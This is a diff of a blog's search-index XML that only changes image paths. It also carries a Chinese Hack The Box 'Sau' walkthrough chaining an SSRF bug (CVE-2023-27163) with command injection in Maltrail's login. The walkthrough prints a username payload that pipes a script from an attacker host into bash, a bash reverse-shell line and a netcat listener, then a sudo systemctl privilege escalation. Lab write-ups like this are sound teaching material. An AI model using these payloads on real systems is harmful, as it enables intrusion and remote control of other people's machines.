@@ -5,24 +5,24 @@
     <url>/myblog/2025/03/17/HTB_Sau/</url>
     <content><![CDATA[<h1 id="Sau"><a href="#Sau" class="headerlink" title="Sau"></a>Sau</h1><p>这个Linux机器主要特点在于利用了两种漏洞结合使用，可以通过CVE-2023-27163的SSRF（Server-Site Request Forgery）攻击，然后发现一个Maltrail程序的服务，版本通过浏览器搜索可以发现是存在未验证攻击的，然后实现命令注入，获取反向shell.最后利用sudo提权。</p>
 <h2 id="ENumeration-枚举"><a href="#ENumeration-枚举" class="headerlink" title="ENumeration(枚举)"></a>ENumeration(枚举)</h2><p>Nmap</p>
-<p><img src="/myblog/dwdw" alt="1"></p>
-<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_nmap.png" alt="1"></p>
+<p><img src="/myblog/.io//dwdw" alt="1"></p>
+<p><img src="/myblog/.io//Users/kaikai/Parallels/Parallel_public/shots/Sau_nmap.png" alt="1"></p>
 <p>发现存在tcp端口22和55555，80端口被过滤。</p>
 <h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_http.png" alt="2"></p>
 <p>发现存在1.2.1版本的request-baskets，通过浏览器搜索可以发现它的这个版本存在（SSRF) CVE-2023-27163漏洞，可以攻击它的&#x2F;api&#x2F;baskets&#x2F;{name}组件。</p>
 <p>通过burpsuite抓包</p>
-<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_bp.png" alt="3"></p>
+<p><img src="/myblog/.io//Users/kaikai/Parallels/Parallel_public/shots/Sau_bp.png" alt="3"></p>
 <p>此处我把get请求改成了post，然后添加了请求头{…}，其中forward_url的参数改为…&#x2F;login，proxy_response为true，然后访问xxx，可以发现能够看到login fail的页面，说明&#x2F;login就是登陆页。</p>
 <p>继续抓包</p>
-<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_bp2.png" alt="4"></p>
+<p><img src="/myblog/.io//Users/kaikai/Parallels/Parallel_public/shots/Sau_bp2.png" alt="4"></p>
 <p>username的值设为<code>curl 10.10.16.5:8000/shell.sh|bash</code>,要用两个&#96;&#96;符号框起来，进行url编码。同时本地开启</p>
 <p><code>python3 -m http.server 8000 </code> ,<code>nc lvnp 9001</code>,shell.sh是从网上找的基础反弹shell<code>bash -i &gt;&amp; /dev/tcp/10.10.16.5/9001 0&gt;&amp;1</code>，</p>
-<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_user.png" alt="5"></p>
+<p><img src="/myblog/.io//Users/kaikai/Parallels/Parallel_public/shots/Sau_user.png" alt="5"></p>
 <p>可以查看到puma用户的flag在家目录下。</p>
 <h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>常规查看sudo -l，即puma用户拥有的权限，是否存在提权可能。</p>
-<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_PE01.png" alt="6"></p>
+<p><img src="/myblog/.io//Users/kaikai/Parallels/Parallel_public/shots/Sau_PE01.png" alt="6"></p>
 <p>尝试systemctl是否有可能提权</p>
-<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_PE02.png" alt="7"></p>
+<p><img src="/myblog/.io//Users/kaikai/Parallels/Parallel_public/shots/Sau_PE02.png" alt="7"></p>
 <p>成功结束！</p>
 ]]></content>
   </entry>
@@ -49,16 +49,22 @@
     <url>/myblog/2025/03/20/test-02/</url>
     <content><![CDATA[<p><img src="/myblog/../images/test01.png"></p>
 <p><img src="/myblog/images/test01.png"></p>
-<p><img src="/myblog/%5Cimage%5Ctest01.png"></p>
+<p><img src="/myblog/.io//%5Cimage%5Ctest01.png"></p>
 <p><img src="/myblog/../images/test01.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>test03</title>
+    <url>/myblog/2025/03/21/test03/</url>
+    <content><![CDATA[<p><img src="/myblog/.io//test03/test03.png"></p>
 ]]></content>
   </entry>
   <entry>
     <title>这是一个测试标题</title>
     <url>/myblog/2025/03/20/test/</url>
-    <content><![CDATA[<p><img src="/myblog/test.png"></p>
-<p><img src="/myblog/img/neko.jpg"></p>
-<p><img src="/myblog/img/neko.jpg"></p>
+    <content><![CDATA[<p><img src="/myblog/.io//test.png"></p>
+<p><img src="/myblog/.io//img/neko.jpg"></p>
+<p><img src="/myblog/.io//img/neko.jpg"></p>
 <p><img src="/myblog/images/test01.png"></p>
 <p><img src="/myblog/images/test01.png"></p>
 ]]></content>
